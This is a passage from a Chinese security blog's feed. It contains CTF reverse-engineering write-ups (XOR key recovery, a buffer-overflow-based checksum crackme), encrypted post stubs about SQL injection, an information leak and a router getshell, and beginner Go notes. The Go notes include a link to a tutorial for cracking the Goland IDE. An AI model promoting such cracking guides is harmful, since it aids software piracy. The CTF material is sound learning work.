class=""><p>检索到一个敏感字符串，以及两个文件名，一个<code>enflag.txt</code>已经提供</p><p>连续定位到读取文件的位置，找到主函数：</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-33-49.png" class=""><p>查看其反汇编代码：</p><p>这里出现了一点小问题，在查看返回编代码时出现栈顶指针地址为负的情况，导致反汇编失败，通俗来说就是IDA不能识别主函数的大括号具体在哪</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-45-50.png" class=""><p>解决办法：打开<code>Options/general</code>，勾选<code>Stack pointer</code>，用于显示栈顶指针的位置</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-47-21.png" class=""><p>这个时候可以看到地址了，然后修改最后一个地址为正数的地址</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-50-29.png" class=""><p>我这里修改为<code>-0x440</code>，将最后一个位置<code>retn</code>那里设为栈顶指针</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-52-25.png" class=""><p>然后我们就可以看出反汇编的代码了：</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_17-53-56.png" class=""><p>分析程序：先把一些明显的函数和变量改成易读的名字</p><p>分析的过程中发现了这样一个函数：</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-03-25.png" class=""><p>点击进去后：发现了我们熟悉的字符串，说明这个函数是校验逻辑，将输入的<code>Key(Str)</code>做了一个异或赋值给了内置的字符串<code>Str1</code>，然后判断<code>Str1</code>的值是否等于<code>DH~mqqvqxB^||zll@Jq~jkwpmvez{</code>，由此我们可以爆破出<code>Key</code>的值</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-04-42.png" class=""><p>写脚本出<code>Key</code>值：<code>[Warnning]Access_Unauthorized</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">"DH~mqqvqxB^||zll@Jq~jkwpmvez{"</span><br>Key = <span class="hljs-string">""</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">29</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">130</span>):<br>        <span class="hljs-keyword">if</span> j^<span class="hljs-number">0x1F</span>==<span class="hljs-built_in">ord</span>(s[i]):<br>            Key+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(Key)<br></code></pre></td></tr></table></figure><p>之后下面那个函数点进去发现就是加密函数，看不懂😭😭😭，再看看其他的</p><p>这时候发现，为什么读入的是<code>flag.txt</code>，而给我的是<code>enflag.txt</code>，这应该是答案输出的文本，那么合理推测，<code>enflag.txt</code>里应该就是被加密的文本，所以我们改一下名称，然后运行程序，输入<code>Key</code>，然后输出答案？🐸</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_18-28-12.png" class=""><p>答案是的！蒙对了🐸，<code>flag</code>输出在了程序新建的<code>enflag.txt</code>里：<code>flag{RC4&amp;-&gt;ENc0d3F1le}</code></p><h3 id="ctfshow-re3"><a href="#ctfshow-re3" class="headerlink" title="ctfshow-re3"></a>ctfshow-re3</h3><p>是个64位的程序，用IDA打开，然后反汇编，得到如下结果</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_10-38-18.png" class=""><p>首先拿到题目，一步一步来看，到<code>strncpy</code>这个位置，发现是将<code>v19</code>的前<code>n</code>个字符复制到<code>dest</code>里 ，然后发现<code>v19</code>根本没有被赋值😂，那<code>copy</code>了个啥呢</p><p>我们发现，<code>s[5]</code>和<code>v19</code>是连续定义的</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_11-10-36.png" class=""><p>查看变量的栈：直接点击变量进去，发现两个变量在<code>main</code>的栈中确实是连续的，那么猜测存在溢出</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_11-18-09.png" class=""><p>点击<code>read_input</code>进去，</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_15-17-01.png" class=""><p>发现确实使用了<code>scan</code>而且没有指定读入长度，那么确实存在溢出，输入的内容前五个字符存在<code>s</code>，其他的都溢出到了<code>v19</code>变量中</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_15-18-32.png" class=""><p>这下解决了<code>v19</code>的问题，</p><p>然后再往下看，读入内容进入变量<code>v5</code>，最后赋值给了<code>array[6]</code>，然后进入循环，将<code>array</code>中的内容一次加到变量<code>a</code>中，最后会加上我们的输入，所以答案就是用<code>0xFFFF</code>减去<code>a</code>最后的值，因为这里我们设置<code>v5</code>的值为0</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_16-27-07.png" class=""><p>所以答案就是<code>hex(65525-58720)</code>，为<code>1A9F</code>，这里填答案，出题者设置的是小写字母</p><img src="/2023/09/14/%E4%B8%8ERe%E7%9A%84%E5%88%9D%E6%AC%A1%E9%82%82%E9%80%85/Snipaste_2023-09-14_16-31-48.png" class=""><p>贴上通关逻辑：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>{<br>    <span class="hljs-type">int</span> array[<span class="hljs-number">8</span>]={<span class="hljs-number">80</span>,<span class="hljs-number">64227</span>,<span class="hljs-number">226312059</span>,<span class="hljs-number">-1540056586</span>,<span class="hljs-number">20496</span>,<span class="hljs-number">3833</span>,<span class="hljs-number">6815</span>};<br>    <span class="hljs-type">unsigned</span> __int64 a=<span class="hljs-number">0LL</span>;<br>    <span class="hljs-type">int</span> v15=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> v14;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>    {<br>        <span class="hljs-keyword">for</span> ( a += (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)array[i]; a &gt; <span class="hljs-number">0xFFFF</span>; a = v15 + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int16)a )<span class="hljs-comment">// a&gt;65535</span><br>        {<br>            v14 = (<span class="hljs-type">unsigned</span> __int16)a;<br>            v15 = a &gt;&gt; <span class="hljs-number">16</span>;<br>        }<br>  }<br>  <span class="hljs-keyword">if</span> ( a == <span class="hljs-number">0xFFFF</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"OK"</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);<br>}<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次由SQL注入到RCE</title>
    <link href="/2023/09/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%B1SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/"/>
    <url>/2023/09/04/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%94%B1SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4cf79468aee65d1d3484142521125bdb887e369c3713b90307a19d9d54c5eaf0"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个信息泄露的逻辑漏洞</title>
    <link href="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5ee64ec38c4528e73f665567ec4092e09972984aac736c1163cb6e0304230854">80f7af2430a3dce6996ee26d1569b238d40224290ffd561b4853cf1c5c8fc0fb92698844a30ef5d5dbc74ad47696e88800feef693e71a6f93fe4ebcb254909fe85bcd3e4f86b85b174d680365ec6971f4389a6f20baf276c8e29ee2eb555190e827e2207861e828cca1449b31162dfbc4c78b306a39147f7c411fdf11572cf4f257712663a6b76869b13ae1727b2097e1cf1f3c36eeba2d13dbd3c5b142c4ec50465b0ede37cf133792cfb682e0224d14d74b7f4da655c6faf1e493e53ecf2a253a84fbf2961c34738c90103b49a7ef351e53b79ea939e9c33f23e1a030103bb6f0fe9c50ca5c1b046ee11bff155ee8f6ee998847371058bb1087452cbc0dac1e46c9b24072492902482abbf5157a323acd6f4577ed7333b2dc126f4eec07227273121ceec0f2d339fb1dcaa1055b54f3663b2aeb323b7b5e50286dd282e8f63ad9916709b7e7bc2118c7cfb0114e010a6fce7d2d15a0f1a7575ef3ffcf40967df065d42e1064b65fc6955a9726c1ec202946b6d3b644cd2d4262bd08aaece7b1c78c7fa73dfb544e7dc5600fa18e08fc15b8fea18b7345ab25cbf24384adf10226cd80a83386cbdc27784b8759945e2818a5abd6648cac084a310187454a6dbc421aba19a77edb2f48b94c5d9e4a5f1d73b4d05d915cbf907afdb09f381f8139272eeb5e17f2dfab491bb5d08a9ce3097a9d78c33968d505ee4a738d02ad6483ddd0dfb59b3093c0bb5769291ac554e1cd00c113132ad4e7e6d58ae276744d08fb54904415b94a1621ff330a3b2c08a847c0ef8da48889dd41aea4595564e388e1f9786c5a824e4daee6e3e82dde57c449a04de82bbbc01a85c39653bc6d44f3f4c9945b6bee66c86365f52c4d285c8fb0bf9cd7e95874cbdd12bedcd88f2725588effffc532515acb9c1a681838bc7ba5082f6c99b452b24d7e0df3b9a343c7a88ee716babaa2b161df1360d487bb71a38d107643be469683e43d5cfd6030917e4cfb1d3ecf452aaf5329ffdc00f5b40d2e3d67cdbbadcef9f92f5194bc7a69080443c596cea5da55ae4808cfde650fd8ef62a6eb540672670057714a2e229612b62cfe5a98fc21288647317907089edc0355cff9306036455548f06a9a6d89284000f899aa43c9875521dabdb42bd1af21bada1a7810ef723e2e7ac344226e1c66c6d9c7cde59ae191572aa28e0087a254aebfb3d70c6a0257e08c48da4926de5c67b4ad2c5043f56fd80b32257816ff5f2fc421be5cbd6c96b6fcfb4fd5cb1e05e7b5ed20cbf776c3cf602bc3ea154425af6e65558e3df7f0506a3653698165aa58e26f54f0357716400a9db8ebce7141678f2c9da53a4bb1f7cec2537da124188234feab8e41736a48d15c1886de58f9f86dc07fe5982508e5a8957a8e068c47b6794509bc5f9414fca75e3146452872eba6ad4912468314544a33a45ad47da904f5860f814c28ed6f7ae933f75f1f43322c260ac73df4f5c8f0aeb72ba919e3d07d1c6615d6fe4fee95add624aa7352d5920f0e416eced2d1230c31b26ae26c283a5ede75f0275bbc1deec32b4bdadd230b08bb29baec85b2c5bc44f86f46bafab41cbfe3f038fab7288dd092ef63e82652bbf14da9c2ea600526d7e10728131df768b36e84ff898796f0f4b7919285111378b1d0732c146f9b4604584ed76788556201234ed392f79f3d959d4ace11333ea251cab2bea8e10718c4d34876304966a8598da4a184c07255c83d20d79a765163ce26491e8e3252ab86c7030bf18df7d662828fc10e2eadaccc48ac9c71bddfe53da168ca14c395201a89290f8a7e1df08aaebad306c4bd8095ff8693827118923095a5c667ad5214f30023d76422c4f65d750b93e09af2c746bee9e1e65606b7781028cae8aabaa59cda506436e6ab32aeb35c2c98952cf0bf271da041436e492ec4fb6caa34a9cc81a32c38319e0042efb7498ac253a55ab9cd24273bb734913488f7a2f48319265567f9103ff5e2ed5f4c2c84543a742a88beb55ab38e5c30e2796d2cbb1b1388963ea1b3eca15ad372999924dbb30ea6dac9e9aef06dfd940d80b03356819049cfa7702d30361a45f12fbf72ffab303cd94d2d5facf706b991504277170a16e6a84c61c4e1f1b5d4c8d4ed9fdface61826f46492eadccf360de1d4ecfa3a48d934578e1cac6e64179c66f2dccc9545da4b90bb216ef97b77fe2fe6472aafd118f20baf0010e318e132d3207b3748da34946d6ebfd3dad6c4693e2e224a07d8ca0925fb43011ef214b698248d189b430060e3260eb20d15256643231c0e13a87a4f4656b0fbd60019215d22bcfadf87e9271b6bdea7639b31a75a63c2cce1df57b8322fbd1a380efe0987fffb6ebfe75f84a0188e6b0091bd0f0fa6c9c7e0afa601a3bea8d799f24bbfe3a7be24976bb4bfc4ef8e77ebc26d71aead84971c626028c8a6da8a5d54dce25ebe542c4b2202b546fc5d96a0e88808a6db2cac2854b408e42c3da0e2a2b72239e92ab1c3a3f94db0d5192d6b7f0ffc663f9325b09bc3f292bf7fdc3a237956c8369494d4168216823fe660a3d714ff1bd3553af58f1b9848bb198fca86e279fc7d659f11b9777d33a050aa19da5bacd201a51bdf1c8f90719e1b5c39023485fc5f55301ea322f802e6854cbf261fd539c7b8e92eada304d5fa38748be799807191f47412e12bb20b5a93d6cdb8c8317b9d799c5490ce09117709c5bce5b5de00a2c6ce754a9f0e7429729949a4edf59370baaa3be2090036a268d392410532d394c6eba769b7e488d2473001153ef9f533abd6467bca3a4f023552f8a7f4f235491e0f08ea5c0589036edb1005250cad548423f9600e3c21b5e09883768073cfc770702297d254dfa23982b04dd1cfee6a046caefdb3ed7eeb78edaef46a446fe4e939c80b6b8f0634e96ba6b6f9747c2c1e1354a8c392cf8dbaafdd58b8135468778417abd333bb6e6f4159704e8f564da4606a30295efea5a2e7fedd71bcd41a045d8f75b17a994ba59632ea821297a700d08671be6e4b4feeab4068a92f4c1f57fb521cb6b0a349880c2fc2a06a5e4e531e8739509d42f85fa83e41683c6f2d3931afe4316b51b4eb7eb0d9698fb96a209612c5c5d57cdfb2445a1067594495e1bb78fc5796d402ab98cdc3cb673011782e4b48a350bf9ab36b7d17ace6085ba1854f9fada86cda1ae28b4c31dc30be556a1cbaefc37a7b6b5a07c1c774cd9cc83bb57970ce73511b09a95c84d01f37efcf3031ba776059e6bcfbdad0e9c6533beef379cf26cccb74ed9bb81f39a6129dd6326288f3da2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次路由器Getshell经历</title>
    <link href="/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell/"/>
    <url>/2023/08/29/%E4%B8%80%E6%AC%A1%E8%B7%AF%E7%94%B1%E5%99%A8Getshell/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2db60c62ba31c3563b1355b737e01d321fb2fd19a1ee792ba239afdca7d9b9c5"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GO学习笔记</title>
    <link href="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>跟着《GO圣经》学习GO啦！</p><span id="more"></span><h3 id="Go的优势"><a href="#Go的优势" class="headerlink" title="Go的优势"></a>Go的优势</h3><ul><li><p>简单易学</p></li><li><ul><li>Go语言的作者都有C的基因，Go自然而然也有了C的基因，但是Go的语法比C还简单, 并且几乎支持大多数你在其他语言见过的特性：封装、继承、多态、反射等</li></ul></li><li><p>丰富的标准库</p></li><li><ul><li>Go目前已经内置了大量的库，特别是网络库非常强大</li><li>前面说了作者是C的作者，所以Go里面也可以直接包含c代码，利用现有的丰富的C库</li></ul></li><li><p>跨平台编译和部署</p></li><li><ul><li>Go代码可直接编译成机器码，不依赖其他库，部署就是扔一个文件上去就完事了. 并且Go代码还可以做到跨平台编译(例如: window系统编译linux的应用)</li></ul></li><li><p>内置强大的工具</p></li><li><ul><li>Go语言里面内置了很多工具链，最好的应该是gofmt工具，自动化格式化代码，能够让团队review变得如此的简单，代码格式一模一样，想不一样都很困难</li></ul></li><li><p>性能优势: Go 极其地快。其性能与 C 或 C++相似。在我们的使用中，Go 一般比 Python 要快 30 倍左右</p></li><li><ul><li>语言层面支持并发，这个就是Go最大的特色，天生的支持并发，可以充分的利用多核，很容易的使用并发</li><li>内置runtime，支持垃圾回收</li></ul></li></ul><h3 id="Go环境搭建"><a href="#Go环境搭建" class="headerlink" title="Go环境搭建"></a>Go环境搭建</h3><h4 id="Goland下载安装"><a href="#Goland下载安装" class="headerlink" title="Goland下载安装"></a>Goland下载安装</h4><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-15_19-49-47.png" class=""><p><a href="https://www.jetbrains.com/go/download/other.html">Goland各版本下载</a></p><p><a href="https://chenjunan.top/detail/Detail?id=37">Goland破解教程</a></p><h4 id="Go语言安装"><a href="#Go语言安装" class="headerlink" title="Go语言安装"></a>Go语言安装</h4><p><a href="https://go.dev/dl/">官网地址</a></p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-15_19-51-26.png" class=""><p><code>go version</code>查看是否安装完成</p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-15_19-55-52.png" class=""><h3 id="开始GO-——Part1"><a href="#开始GO-——Part1" class="headerlink" title="开始GO!——Part1"></a>开始GO!——Part1</h3><p>笔者跟着《Go语言圣经》一起学习的~~😘</p><p>对应第一章</p><h4 id="编写第一个GO程序"><a href="#编写第一个GO程序" class="headerlink" title="编写第一个GO程序"></a>编写第一个GO程序</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">"fmt"</span><br><span class="hljs-string">"io/ioutil"</span><br><span class="hljs-string">"net/http"</span><br><span class="hljs-string">"os"</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-comment">// 通过循环遍历命令行参数中的每个URL</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br><span class="hljs-comment">// 使用HTTP GET请求获取URL的响应</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>}<br><br><span class="hljs-comment">// 读取响应体的内容</span><br>b, err := ioutil.ReadAll(resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果在读取过程中发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>}<br><br><span class="hljs-comment">// 将获取到的内容输出到标准输出</span><br>fmt.Printf(<span class="hljs-string">"%s"</span>, b)<br>}<br>}<br></code></pre></td></tr></table></figure><p>在命令行里执行<code>go run .\Hello.go http://gopl.io</code>，得到返回包，说明你的Go语言环境已经完全搭建成功啦！</p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_12-43-23.png" class=""><h4 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h4><p><code>os</code>包提供一些与操作系统交互的函数和变量，程序的命令行参数可以从<code>os</code>包的Args变量获取。</p><p><code>os.Args</code>变量是一个字符串的切片，区间索引时，同样是<strong>左闭右开</strong></p><p><code>os.Args</code>的第一个元素，<code>os.Args[0]</code>, 是命令本身的名字；其它的元素则是程序启动时传给它的 参数。s[m:n]形式的切片表达式，产生从第m个元素到第n-1个元素的切片。如果省略切片表达式的m或n，会默认传入0或 len(s)，因此切片可以简写成os.Args[1:]。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-comment">//测试程序</span><br><span class="hljs-keyword">import</span> (<br>   <span class="hljs-string">"fmt"</span><br>   <span class="hljs-string">"os"</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   <span class="hljs-keyword">var</span> s, sep <span class="hljs-type">string</span><br>   <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt; <span class="hljs-built_in">len</span>(os.Args); i++ {<br>      s += sep + os.Args[i]<br>      sep = <span class="hljs-string">" "</span><br>   }<br>   fmt.Println(s)<br>}<br></code></pre></td></tr></table></figure><p>对于上面的程序，我们可以有如下理解：</p><ul><li><p>GO里面注释使用<code>//</code></p></li><li><p>GO初始定义的变量若是没有赋值，则隐式地被赋为零值，数值类型是0，字符串类型是空字符串””</p></li><li><p>对于string类型的变量，<code>+</code>号可以直接连接字符串</p></li><li><p>循环变量<code>i</code>没有定义类型，是因为。<strong>符号<code>:=</code> 是短变量声明的一部分</strong>, 这是定义一个或多个变量并根据它们的初始值为这些变量赋予适当类型的语句</p></li><li><p>GO中<code>i++</code>是语句，不是表达式，所以不能用于赋值，**<code>j=i++</code>非法<strong>，而且<code>++</code>和<code>--</code>都只 能放在变量名后面，因此</strong><code>--i </code>也非法**</p></li><li><p>GO中只有<code>for</code>一种循环语句，但有多种形式</p><ul><li><p>第一种：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> initialization; condition; post{<br>    <br>}<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for 循环三个部分不需要括号包围，左大括号必须与post同一行</span><br><span class="hljs-comment">initalization如果存在，必须是一条简单语句。即，短变量声明、自增语句、赋值语句或函数调用。</span><br><span class="hljs-comment">condition 是一个布尔表达式（boolean expression），其值在每次循环迭代开始时计算。如果为 true 则执行循环体语句。</span><br><span class="hljs-comment">post语句在循环体执行结束后执行，之后再次对conditon求值。condition 值为 false 时，循环结束</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li><li><p>省略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// a traditional "while" loop</span><br><span class="hljs-keyword">for</span> condition {<br><br>}<br><span class="hljs-comment">//上面就是省略了初始化和post，变成了熟悉的while循环</span><br></code></pre></td></tr></table></figure></li><li><p>使用<code>range</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, arg := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>s += sep + arg<br>sep = <span class="hljs-string">" "</span><br>}<br><span class="hljs-comment">/*for 循环的另一种形式, 在某种数据类型的区间（range）上遍历，如字符串或切片。</span><br><span class="hljs-comment">大多数程序员都这么写for循环</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>每次循环迭代，range产生一对值：索引以及索引对应的元素值<br>但是我们这个例子不需要索引，而<strong>range的语法要求：要处理元素，必须处理索引</strong><br>而且<strong>GO不允许使用无用的局部变量，会编译错误</strong><br>解决方法是使用空标识符<code>_</code>，<strong>空标识符可用于任何语法需要变量名但程序逻辑不需要的时候</strong></p></li></ul></li><li><p>声明一个变量有好几种方式，下面这些都等价：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s := <span 